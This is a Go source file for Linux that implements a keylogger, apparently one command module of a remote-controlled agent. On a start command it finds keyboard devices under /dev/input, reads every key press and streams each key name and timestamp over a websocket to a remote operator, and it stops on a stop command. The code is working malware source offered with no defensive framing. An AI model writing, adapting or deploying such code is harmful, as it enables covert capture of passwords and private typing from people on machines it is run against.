//go:build linux

package main

import (
	"bufio"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

var (
	keylogMu     sync.Mutex
	keylogCancel context.CancelFunc
)

// Linux input event struct (from <linux/input.h>)
type inputEvent struct {
	Sec   uint64
	Usec  uint64
	Type  uint16
	Code  uint16
	Value int32
}

// execKeylog starts or stops live keyboard capture.
// Payload: {"action":"start","device":"auto"} or {"action":"stop"}
func execKeylog(payload json.RawMessage) map[string]any {
	var p struct {
		Action string `json:"action"`
		Device string `json:"device"`
	}
	_ = json.Unmarshal(payload, &p)

	if p.Action == "stop" {
		keylogMu.Lock()
		if keylogCancel != nil {
			keylogCancel()
			keylogCancel = nil
		}
		keylogMu.Unlock()
		return map[string]any{"status": "stopped"}
	}

	keylogMu.Lock()
	if keylogCancel != nil {
		keylogCancel()
	}
	ctx, cancel := context.WithCancel(context.Background())
	keylogCancel = cancel
	keylogMu.Unlock()

	go runKeylog(ctx, p.Device)

	return map[string]any{
		"status": "started",
		"method": "evdev",
	}
}

func runKeylog(ctx context.Context, deviceHint string) {
	debugLog.Printf("[keylog] started")
	defer debugLog.Printf("[keylog] stopped")

	devices := findKeyboardDevices(deviceHint)
	if len(devices) == 0 {
		wsSend("stream_frame", map[string]any{
			"stream": "keylog",
			"error": "no keyboard device found in /dev/input/ (needs root)",
		})
		return
	}

	// Open all keyboard event files
	var files []*os.File
	for _, dev := range devices {
		f, err := os.Open(dev)
		if err != nil {
			continue
		}
		files = append(files, f)
	}
	defer func() {
		for _, f := range files {
			f.Close()
		}
	}()

	if len(files) == 0 {
		wsSend("stream_frame", map[string]any{
			"stream": "keylog",
			"error": "could not open any keyboard device (permission denied?)",
		})
		return
	}

	// Read from all devices concurrently
	var wg sync.WaitGroup
	for _, f := range files {
		wg.Add(1)
		go func(file *os.File) {
			defer wg.Done()
			readEvdevEvents(ctx, file)
		}(f)
	}

	<-ctx.Done()
	wg.Wait()
}

func findKeyboardDevices(hint string) []string {
	if hint != "" && hint != "auto" {
		return []string{hint}
	}

	matches, _ := filepath.Glob("/dev/input/event*")
	var keyboards []string

	for _, m := range matches {
		// Check if device supports EV_KEY (type 1)
		namePath := fmt.Sprintf("/sys/class/input/%s/device/name", filepath.Base(m))
		nameBytes, err := os.ReadFile(namePath)
		if err != nil {
			continue
		}
		name := strings.TrimSpace(string(nameBytes))
		lower := strings.ToLower(name)

		// Heuristic: keyboard devices usually contain these keywords
		if strings.Contains(lower, "keyboard") ||
			strings.Contains(lower, "key") ||
			strings.Contains(lower, "input") ||
			strings.Contains(lower, "at translated") {
			keyboards = append(keyboards, m)
		}
	}

	// If heuristic found nothing, try all event devices
	if len(keyboards) == 0 && len(matches) > 0 {
		keyboards = matches[:1] // at least try event0
	}

	return keyboards
}

func readEvdevEvents(ctx context.Context, file *os.File) {
	eventSize := binary.Size(inputEvent{})
	buf := make([]byte, eventSize)
	reader := bufio.NewReader(file)

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		_, err := reader.Read(buf)
		if err != nil {
			return
		}

		var ev inputEvent
		if err := binary.Read(strings.NewReader(string(buf)), binary.LittleEndian, &ev); err != nil {
			continue
		}

		// EV_KEY = 1, value 1 = press, 0 = release, 2 = repeat
		// We only care about key presses (value == 1)
		if ev.Type != 1 || ev.Value != 1 {
			continue
		}

		keyName := keyCodeToName(ev.Code)
		if keyName == "" {
			continue
		}

		wsSend("stream_frame", map[string]any{
			"stream": "keylog",
			"key": keyName,
			"code": ev.Code,
			"timestamp": time.Now().Format(time.RFC3339Nano),
		})
	}
}

// keyCodeToName maps Linux KEY_* codes to readable names.
// Subset of the most common keys from <linux/input-event-codes.h>
func keyCodeToName(code uint16) string {
	keyMap := map[uint16]string{
		1: "ESC", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
		12: "MINUS", 13: "=", 14: "BACKSPACE", 15: "TAB",
		16: "Q", 17: "W", 18: "E", 19: "R", 20: "T", 21: "Y", 22: "U", 23: "I", 24: "O", 25: "P",
		26: "LEFTBRACE", 27: "RIGHTBRACE", 28: "ENTER",
		29: "LCTRL", 30: "A", 31: "S", 32: "D", 33: "F", 34: "G", 35: "H", 36: "J", 37: "K", 38: "L",
		39: "SEMICOLON", 40: "APOSTROPHE", 41: "GRAVE",
		42: "LSHIFT", 43: "BACKSLASH", 44: "Z", 45: "x", 46: "C", 47: "V", 48: "B", 49: "N", 50: "M",
		51: "COMMA", 52: ".", 53: "/", 54: "RSHIFT",
		55: "KP*", 56: "LALT", 57: "Space", 58: "CapsLock",
		59: "F1", 60: "F2", 61: "F3", 62: "F4", 63: "F5", 64: "F6",
		65: "F7", 66: "F8", 67: "F9", 68: "F10",
		69: "NUMLOCK", 70: "SCROLLLOCK",
		71: "KP7", 72: "KP8", 73: "KP9", 74: "KP-",
		75: "KP4", 76: "KP5", 77: "KP6", 78: "KP+",
		79: "KP1", 80: "KP2", 81: "KP3", 82: "KP0", 83: "KP.",
		87: "F11", 88: "F12",
		96: "KPEnter", 97: "RightCtrl", 98: "KP/",
		100: "RALT", 102: "HOME", 103: "UP", 104: "PAGEUP",
		105: "LEFT", 106: "RIGHT", 107: "END", 108: "DOWN", 109: "PAGEDOWN",
		110: "INSERT", 111: "DELETE",
		119: "PAUSE", 125: "LWIN", 126: "RWIN", 127: "COMPOSE",
	}
	if name, ok := keyMap[code]; ok {
		return name
	}
	return fmt.Sprintf("KEY_%d", code)
}
